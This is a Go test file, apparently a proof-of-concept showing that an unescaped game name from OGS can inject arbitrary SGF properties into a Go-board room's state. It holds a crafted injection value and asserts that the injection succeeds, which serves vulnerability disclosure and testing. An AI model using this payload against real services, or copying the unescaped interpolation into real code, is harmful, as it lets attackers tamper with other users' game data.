package plugin

import (
	"fmt"
	"testing"

	"github.com/golab/board/pkg/state"
)

// PoC: OGS-controlled game_name injects arbitrary SGF properties through the
// unescaped fmt.Sprintf interpolation in gameInfoToSGF.
func TestZZOGSSGFInjection(t *testing.T) {
	maliciousName := `x]C[INJECTED-COMMENT]LB[aa:PWNED]ZZ[`
	gamedata := map[string]any{
		"width": 19.0, "komi": 6.5,
		"game_name": maliciousName,
		"rules": "japanese",
		"players": map[string]any{
			"black": map[string]any{"username": "attacker", "rank": 10.0},
			"white": map[string]any{"username": "victim", "rank": 12.0},
		},
		"initial_player": "black",
		"initial_state": map[string]any{"black": "", "white": ""},
		"moves": []any{},
	}
	o := &OGSConnector{}
	sgf := o.gamedataToSGF(gamedata)
	fmt.Printf("constructed SGF: %s\n", sgf)
	s, err := state.FromSGF(sgf)
	if err != nil {
		t.Fatalf("FromSGF rejected injected SGF: %v", err)
	}
	foundC, foundLB := false, false
	for _, f := range s.Current().AllFields() {
		fmt.Printf("root field: %s = %v\n", f.Key, f.Values)
		if f.Key == "C" && len(f.Values) > 0 && f.Values[0] == "INJECTED-COMMENT" {
			foundC = true
		}
		if f.Key == "LB" {
			foundLB = true
		}
	}
	if !foundC || !foundLB {
		t.Fatalf("injection failed: C=%v LB=%v", foundC, foundLB)
	}
	fmt.Println("INJECTION CONFIRMED: attacker-controlled SGF properties entered room state")
}
